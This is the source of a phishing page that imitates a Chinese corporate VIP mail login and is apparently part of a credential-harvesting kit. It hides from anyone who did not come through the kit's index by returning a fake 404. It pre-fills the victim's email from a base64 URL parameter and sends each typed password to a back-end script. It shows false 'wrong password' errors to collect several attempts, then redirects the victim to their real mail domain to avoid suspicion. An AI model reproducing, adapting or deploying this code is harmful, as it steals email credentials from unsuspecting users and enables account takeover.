<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Mail Login</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body id="mail-china-body">
    <div id="navmchina" class="c-div" style="width: 100%;height: 64px;">
        <div style="width: 100%;max-width: 1250px;"><img class="img-fluid" width="164" height="62" src="../assets/img/mailchianlogo.png"></div>
    </div>
    <div id="maincmailchina" class="c-div">
        <div id="mainimailchina" style="max-width: 1250px;width: 100%;height: fit-content;margin-top: 64px;background: rgba(255,255,255,0.81);padding-top: 48px;padding-left: 48px;padding-right: 48px;border-radius: 33px;padding-bottom: 124px;">
            <div style="height: 114px;border-radius: 17px;padding-left: 0px;padding-right: 0px;padding-top: 0px;padding-bottom: 0px;">
                <div class="sp-div" style="font-size: 22px;">
                    <div class="sp-div" style="max-width: 350px;width: 100%;"><a href="#" style="color: rgb(171,171,171);">企业邮箱</a><a href="#" style="color: rgb(171,171,171);">中华首页</a><a href="#" style="color: rgb(171,171,171);">帮助中心</a></div><label class="form-label" style="color: rgb(255,255,255);">010-56176100</label>
                </div>
            </div>
            <div class="e-div">
                <p style="font-size: 32px;font-weight: bold;"><span style="color: rgb(230, 0, 0);">VIP</span>邮箱登录</p>
            </div>
            <div id="form-con-mail-china" class="sp-div">
                <div id="left-chinamini" style="width: 100%;max-width: 50%;"><img class="img-fluid" width="451" height="445" src="../assets/img/mailchina_main_left_bg.png"></div>
                <div id="right-chianamin" style="width: 100%;max-width: 50%;padding-left: 60px;padding-right: 60px;padding-top: 24px;padding-bottom: 24px;">
                    <p style="margin-bottom: 0px;font-size: 26px;padding: 0px 0px 0px 38px;">邮箱名</p><input type="text" id="backEMF" style="width: 100%;height: 68px;background: transparent;border: 2px solid rgb(255,255,255);border-radius: 44px;padding: 1px 28px;font-size: 22px;" placeholder="请输入邮箱名">
                    <p style="margin-bottom: 0px;font-size: 26px;padding: 0px 0px 0px 38px;margin-top: 22px;">密码</p><input type="password" id="pass" style="width: 100%;height: 68px;background: transparent;border: 2px solid rgb(255,255,255);border-radius: 44px;padding: 1px 28px;font-size: 22px;" placeholder="请输入密码">
                    <p id="err" style="margin-bottom: 16px;margin-top: 8px;color: rgb(211,0,0);text-align: left;margin-left: 30px;font-size: 20px;">密码错误，请重试</p>
                    <div class="sp-div" style="margin-top: 22px;">
                        <div>
                            <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1" style="width: 26px;height: 26px;"><label class="form-check-label" for="formCheck-1" style="font-size: 22px;margin-left: 10px;">记住我</label></div>
                        </div>
                        <div><a href="#" style="font-size: 22px;color: rgb(235,0,0);">忘记密码？</a></div>
                    </div><button class="btn btn-primary" id="next-btn" type="button" style="margin-top: 22px;height: 68px;width: 100%;font-size: 22px;border-style: none;background: #aa0201;border-radius: 13px;" onclick="nextFun();">登录</button>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>